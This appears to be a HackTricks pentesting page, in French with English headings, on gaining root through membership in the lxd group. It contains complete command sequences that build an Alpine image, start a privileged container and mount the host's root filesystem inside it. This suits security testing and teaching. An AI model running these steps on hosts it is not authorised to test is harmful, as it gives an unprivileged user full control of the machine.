# Groupe lxd/lxc - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

L'appartenance au groupe de gestion LXD de l'hôte (normalement _**lxd**_) peut fournir un chemin vers root en permettant un contrôle total du daemon.<sup>[[1]](#references)</sup>

## Exploiting without internet

### Method 1

Vous pouvez télécharger une image Alpine à utiliser avec LXD depuis un repository de confiance.
Le serveur d'images LXD de Canonical publie des builds quotidiens : [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Récupérez simplement **lxd.tar.xz** et **rootfs.squashfs** depuis le build le plus récent (le nom du répertoire correspond à la date).<sup>[[8]](#references)</sup>

Vous pouvez également installer distrobuilder sur votre machine en suivant les [instructions du projet](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Téléversez **incus.tar.xz** (**lxd.tar.xz** si vous l’avez téléchargé depuis le serveur d’images Canonical) et **rootfs.squashfs**, puis importez l’image et créez un conteneur.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Si vous rencontrez cette erreur _**Error: No storage pool found. Please create a new storage pool**_\
> Exécutez **`lxd init`**, configurez un storage pool par défaut, puis **répétez le bloc de commandes précédent**.<sup>[[2]](#references)</sup>

Enfin, démarrez le conteneur et ouvrez un shell root sur le système de fichiers de l’hôte :<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Méthode 2

Construisez une image Alpine et démarrez-la avec le flag `security.privileged=true`, ce qui mappe le root du container sur le root de l’hôte ; monter `/` expose alors le système de fichiers de l’hôte à l’intérieur du container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [Comment renforcer la sécurité de LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Conteneurs et machines virtuelles LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Comment copier et importer des images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Comment créer des images avec distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Définition d’image Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Script de build de lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Serveur d’images LXD](https://images.lxd.canonical.com/)
- [9] [Type : disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
